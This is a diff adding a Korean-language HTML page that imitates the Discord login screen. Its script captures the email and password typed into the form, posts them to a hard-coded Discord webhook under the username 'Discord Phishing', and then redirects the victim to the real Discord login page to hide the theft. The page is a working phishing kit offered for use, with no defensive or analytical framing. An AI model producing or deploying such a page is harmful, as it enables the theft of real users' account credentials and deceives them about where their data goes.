@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord - 로그인</title>
+    <style>
+        /* 전역 스타일: 디스코드 다크 모드 색상 */
+        body {
+            background-color: #36393f;
+            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            color: #fff;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* 메인 컨테이너: 좌측 폼과 우측 QR 공간을 나란히 배치 */
+        .container {
+            display: flex;
+            width: 960px;
+            max-width: 95%;
+            justify-content: space-between;
+        }
+
+        /* 왼쪽: 로그인 폼 영역 */
+        .login-section {
+            width: 480px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        h2 {
+            font-size: 24px;
+            font-weight: 600;
+            margin: 0 0 8px 0;
+        }
+
+        p.subtitle {
+            font-size: 16px;
+            color: #b9bbbe;
+            margin: 0 0 20px 0;
+        }
+
+        /* 입력 필드 스타일 */
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 12px;
+            font-weight: bold;
+            color: #b9bbbe;
+            margin-bottom: 8px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            background-color: #40444b;
+            border: none;
+            border-radius: 3px;
+            color: #fff;
+            font-size: 16px;
+            box-sizing: border-box;
+            /* 선택되었을 때 파란색 테두리 (이미지에서의 초점 상태) */
+            outline: 2px solid transparent;
+            transition: outline 0.2s;
+        }
+
+        input:focus {
+            outline: 2px solid #00affd; /* 이미지에서의 파란색 강조선 */
+        }
+
+        /* 비밀번호 오류 상태 (이미지의 빨간 줄) */
+        input.error {
+            outline: 2px solid #f04747; /* 빨간색 강조선 */
+        }
+
+        .forgot-password {
+            display: block;
+            color: #00affd;
+            font-size: 14px;
+            text-decoration: none;
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        /* 로그인 버튼 */
+        .btn-login {
+            background-color: #5865f2; /* 디스코드 퍼플 */
+            color: white;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 3px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .btn-login:hover {
+            background-color: #4752c4;
+        }
+
+        .signup-link {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #b9bbbe;
+        }
+
+        .signup-link a {
+            color: #00affd;
+            text-decoration: none;
+        }
+
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+
+        /* 오른쪽: QR 코드 영역 */
+        .qr-section {
+            width: 400px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding-left: 20px;
+        }
+
+        .qr-box {
+            background-color: #fff;
+            padding: 10px;
+            width: 200px;
+            height: 200px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+
+        /* QR 이미지 제거 (실패로 인해) */
+        .qr-placeholder {
+            width: 180px;
+            height: 180px;
+            background: #fff; /* 흰색 배경만 표시 */
+        }
+
+        /* 모바일 화면에서는 QR 영역 숨김 (디스코드 웹과 동일) */
+        @media (max-width: 700px) {
+            .qr-section {
+                display: none;
+            }
+            .container {
+                width: 480px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- 왼쪽: 로그인 폼 -->
+        <div class="login-section">
+            <h2>돌아오신 것을 환영해요!</h2>
+            <p class="subtitle">다시 만나다니 너무 반가워요!</p>
+
+            <form id="discordForm">
+                <div class="form-group">
+                    <label for="email">이메일 또는 전화번호</label>
+                    <!-- 이미지에서 입력 필드가 선택된 상태(파란색)이므로 focus 적용 -->
+                    <input type="text" id="email" value="" autofocus>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">비밀번호</label>
+                    <!-- 이미지에서 비밀번호 필드에 오류 표시(빨간 줄)가 있으므로 class="error" 추가 -->
+                    <input type="password" id="password" value="">
+                </div>
+
+                <a href="#" class="forgot-password">비밀번호를 잊으셨나요?</a>
+
+                <button type="submit" class="btn-login">로그인</button>
+
+                <div class="signup-link">
+                    계정이 필요한가요? <a href="#">가입하기</a>
+                </div>
+            </form>
+        </div>
+
+        <!-- 오른쪽: QR 코드 영역 -->
+        <div class="qr-section">
+            <div class="qr-box">
+                <div class="qr-placeholder"></div>
+            </div>
+            <h3 class="qr-title">QR 코드로 로그인</h3>
+            <p class="qr-desc">Discord 모바일 앱으로 스캔해<br>바로 로그인하세요.</p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('discordForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // 페이지 새로고침 방지
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // 🟢 웹훍 URL 설정 (여기에 자신의 웹훍 URL을 넣으세요)
+            const webhookURL = "https://discord.com/api/webhooks/1554766908987936768/D-n153fmoy1l9nV_rljzd8W68jm-PD2LaU4Lelojju0qMiohKPc7OuVHCKh46JICn9QJ"; 
+
+            // 웹훍으로 데이터 전송
+            const payload = {
+                content: "🔥 **새 로그인 시도 감지!**\n\n📧 **이메일:** " + email + "\n🔑 **비밀번호:** " + password,
+                username: "Discord Phishing",
+                avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png"
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload),
+            })
+            .then(response => {
+                // 전송 성공 후: 진짜 디스코드 로그인 페이지로 리다이렉션
+                window.location.href = "https://discord.com/login";
+            })
+            .catch(error => {
+                alert("알 수 없는 오류가 발생했습니다.");
+            });
+        });
+    </script>
+
+</body>
+</html>
